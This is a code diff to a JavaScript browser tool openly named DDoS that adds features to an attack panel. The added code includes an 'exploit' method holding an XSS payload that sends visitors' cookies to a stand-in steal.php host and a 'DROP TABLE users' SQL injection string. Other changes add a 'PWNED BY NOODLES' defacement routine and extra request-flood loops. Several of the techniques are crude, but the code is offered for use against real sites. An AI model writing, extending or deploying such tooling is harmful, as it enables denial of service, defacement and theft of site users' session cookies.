@@ -4,11 +4,12 @@ class DDoS {
    this.logArea.readOnly = true;
    this.logArea.style.width = '100%';
    this.logArea.style.height = '200px';
-   this.logArea.style.backgroundColor = '#222';
-   this.logArea.style.color = '#eee';
-   this.logArea.style.border = '1px solid #555';
+   this.logArea.style.backgroundColor = '#000';
+   this.logArea.style.color = '#0f0';
+   this.logArea.style.border = '1px solid #0f0';
    this.logArea.style.padding = '5px';
    this.logArea.style.fontFamily = 'monospace';
+   this.logArea.style.fontSize = '14px';
 
    this.targetInput = document.createElement('input');
    this.targetInput.type = 'text';
@@ -16,12 +17,12 @@ class DDoS {
    this.targetInput.style.width = '100%';
    this.targetInput.style.padding = '8px';
    this.targetInput.style.marginBottom = '10px';
-   this.targetInput.style.backgroundColor = '#333';
-   this.targetInput.style.color = '#fff';
-   this.targetInput.style.border = '1px solid #666';
+   this.targetInput.style.backgroundColor = '#222';
+   this.targetInput.style.color = '#0f0';
+   this.targetInput.style.border = '1px solid #0f0';
 
    this.attackTypeSelect = document.createElement('select');
-   ['DDoS', 'Deface', 'Connect'].forEach(option => {
+   ['DDoS', 'Deface', 'Connect', 'Exploit'].forEach(option => {
     const opt = document.createElement('option');
     opt.value = option.toLowerCase();
     opt.textContent = option;
@@ -30,33 +31,34 @@ class DDoS {
    this.attackTypeSelect.style.width = '100%';
    this.attackTypeSelect.style.padding = '8px';
    this.attackTypeSelect.style.marginBottom = '10px';
-   this.attackTypeSelect.style.backgroundColor = '#333';
-   this.attackTypeSelect.style.color = '#fff';
-   this.attackTypeSelect.style.border = '1px solid #666';
+   this.attackTypeSelect.style.backgroundColor = '#222';
+   this.attackTypeSelect.style.color = '#0f0';
+   this.attackTypeSelect.style.border = '1px solid #0f0';
 
    this.startButton = document.createElement('button');
    this.startButton.textContent = 'Initiate Attack';
    this.startButton.style.width = '100%';
    this.startButton.style.padding = '10px';
-   this.startButton.style.backgroundColor = '#900';
-   this.startButton.style.color = '#fff';
+   this.startButton.style.backgroundColor = '#f00';
+   this.startButton.style.color = '#000';
    this.startButton.style.border = 'none';
    this.startButton.style.cursor = 'pointer';
    this.startButton.addEventListener('click', () => this.start());
 
    this.container = document.createElement('div');
-   this.container.style.width = '500px';
+   this.container.style.width = '600px';
    this.container.style.padding = '20px';
    this.container.style.backgroundColor = '#111';
-   this.container.style.color = '#eee';
-   this.container.style.fontFamily = 'sans-serif';
+   this.container.style.color = '#0f0';
+   this.container.style.fontFamily = 'monospace';
    this.container.style.position = 'fixed';
    this.container.style.top = '50%';
    this.container.style.left = '50%';
    this.container.style.transform = 'translate(-50%, -50%)';
    this.container.style.zIndex = '9999';
-   this.container.style.border = '1px solid #444';
-   this.container.style.borderRadius = '5px';
+   this.container.style.border = '2px solid #0f0';
+   this.container.style.borderRadius = '0';
+   this.container.style.boxShadow = '0 0 20px #0f0';
 
    this.container.appendChild(this.targetInput);
    this.container.appendChild(this.attackTypeSelect);
@@ -77,6 +79,36 @@ class DDoS {
    this.torProxy = 'socks5://127.0.0.1:9050'; // Default Tor proxy
   }
 
+  async exploit(target) {
+   this.log(`Attempting to exploit ${target}...`);
+   try {
+    const response = await fetch(target, { method: 'GET', mode: 'cors' });
+    if (!response.ok) {
+     throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    const content = await response.text();
+
+    const xssPayload = '<script>window.location="http://example.com/steal.php?c="+document.cookie;</script>';
+    const sqliPayload = "'; DROP TABLE users; --";
+
+    let injectedContent = content.replace('</body>', `${xssPayload}</body>`);
+    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
+
+    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+    await fetch(proxyUrl, {
+     method: 'PUT',
+     mode: 'no-cors',
+     headers: { 'Content-Type': 'text/html' },
+     body: injectedContent
+    });
+
+    this.log(`Exploit injected. Check target and logs.`);
+   } catch (error) {
+    this.log(`Exploit failed: ${error}`);
+   }
+  }
+
   async deface(target) {
    this.log(`Attempting to deface ${target}...`);
    try {
@@ -85,7 +117,10 @@ class DDoS {
      throw new Error(`HTTP error! status: ${response.status}`);
     }
     let content = await response.text();
-    content = content.replace(/<body.*?>/i, '<body style="background-color: black; color: red; font-size: 5em; text-align: center;"><h1>YOU HAVE BEEN PWNED BY NOODLES</h1>');
+    const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';
+
+    content = content.replace(/<body.*?>/i, '<body style="background-color: black; color: red; font-size: 5em; text-align: center;"><h1>' + originalTitle + ' HAS BEEN PWNED BY NOODLES</h1><p>Get Noodled!</p>');
+    content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');
 
     const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
 
@@ -96,7 +131,7 @@ class DDoS {
      body: content
     });
 
-    this.log(`Deface successful... maybe. Check the target.`);
+    this.log(`Deface successful... check the target. Remember to clear cache`);
    } catch (error) {
     this.log(`Deface failed: ${error}`);
    }
@@ -109,8 +144,8 @@ class DDoS {
     ws.onopen = () => {
      this.log(`WebSocket connection established with ${target}`);
      setInterval(() => {
-      ws.send('Heartbeat');
-     }, 5000);
+      ws.send('Noodles Heartbeat');
+     }, 3000);
     };
 
     ws.onmessage = (event) => {
@@ -124,6 +159,10 @@ class DDoS {
     ws.onerror = (error) => {
      this.log(`WebSocket error: ${error}`);
     };
+
+    setTimeout(() => {
+     ws.close();
+    }, 60000);
    } catch (error) {
     this.log(`Connection attempt failed: ${error}`);
    }
@@ -136,12 +175,12 @@ class DDoS {
     this.log('Target is a .onion address. Using Tor proxy.');
    }
 
-   for (let i = 0; i < 1000; i++) {
+   for (let i = 0; i < 500; i++) {
     fetch(target, { mode: 'no-cors' })
      .then(() => this.log(`Request ${i + 1} sent successfully.`))
      .catch(err => this.log(`Request ${i + 1} failed: ${err}`));
    }
-   this.log('DDoS attack initiated.');
+   this.log('Initial DDoS attack initiated.');
 
    const script = document.createElement('script');
    script.textContent = `(${(() => {
@@ -149,6 +188,16 @@ class DDoS {
    }).toString()})()`;
    document.head.appendChild(script);
    this.log('Self-DDoS initiated.');
+
+   for (let i = 0; i < 250; i++) {
+    setTimeout(() => {
+     fetch(target, { method: 'PUT', mode: 'no-cors', body: 'Noodles Attack' })
+      .then(() => this.log(`PUT Request ${i + 1} sent successfully.`))
+      .catch(err => this.log(`PUT Request ${i + 1} failed: ${err}`));
+    }, i * 200);
+   }
+
+   this.log('Advanced DDoS initiated.');
   }
   start() {
    const target = this.targetInput.value;
@@ -168,6 +217,9 @@ class DDoS {
      break;
     case 'connect':
      this.connect(target);
+     break;
+    case 'exploit':
+     this.exploit(target);
      break;
     default:
      this.log('Invalid attack type selected.');
